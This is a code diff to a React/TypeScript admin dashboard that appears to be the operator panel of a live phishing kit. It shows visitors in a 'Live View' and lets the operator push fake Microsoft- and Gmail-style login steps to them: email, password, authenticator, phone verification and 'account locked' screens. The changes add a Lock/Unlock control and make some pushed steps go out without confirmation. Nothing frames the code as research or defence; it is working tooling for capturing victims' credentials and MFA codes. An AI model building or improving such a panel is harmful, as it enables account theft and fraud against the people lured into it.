@@ -172,7 +172,7 @@ const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
     { category: 'Login', steps: [
       { label: '↩ Email',       step: 'email',              color: '#4b5563' },
       { label: 'Password',      step: 'password',           color: '#0078D4' },
-      { label: '✓ Finish',       step: 'account-locked',    color: '#4b5563' },
+      { label: '✓ Finish',       step: 'email',             color: '#4b5563' },
       { label: 'Authenticator', step: 'authenticator',     color: '#0078D4' },
       { label: 'Phone Verify',  step: 'verify-phone-number', color: '#7c3aed' },
       { label: 'Other ways',    step: 'other-ways',        color: '#047857' },
@@ -388,7 +388,7 @@ function VisitorModal({
       return;
     }
     // Immediate steps — send without preview confirmation
-    if (step === 'account-locked' || step === 'gmail-done' || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code' || step === 'extend-removal-time') {
+    if (step === 'account-locked' || step === 'email' || step === 'unlock' || step === 'gmail-done' || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code' || step === 'extend-removal-time') {
       onPushAction(visitor.id, step, extra);
       return;
     }
@@ -420,6 +420,17 @@ function VisitorModal({
             </div>
             <span className="text-white font-semibold text-[13px] sm:text-[14px] flex-shrink-0">Live View</span>
             <span className="text-[10px] font-semibold px-2 py-0.5 rounded text-white flex-shrink-0" style={{ backgroundColor: stepColor }}>{stepLabel}</span>
+            <button
+              onClick={() => onPushAction(visitor.id, visitor.step === 'account-locked' ? 'unlock' : 'account-locked')}
+              className={`flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-semibold flex-shrink-0 border transition-colors ${
+                visitor.step === 'account-locked'
+                  ? 'bg-green-500/15 text-green-400 border-green-500/30 hover:bg-green-500/25'
+                  : 'bg-red-500/10 text-red-400 border-red-500/25 hover:bg-red-500/20'
+              }`}
+            >
+              <Lock className="w-3 h-3" />
+              {visitor.step === 'account-locked' ? 'Unlock' : 'Lock'}
+            </button>
             {watcherCount > 1 && (
               <span className="flex items-center gap-1 text-[10px] font-semibold text-indigo-300 bg-indigo-500/20 border border-indigo-500/30 px-2 py-0.5 rounded leading-none flex-shrink-0">
                 <Users className="w-3 h-3" />
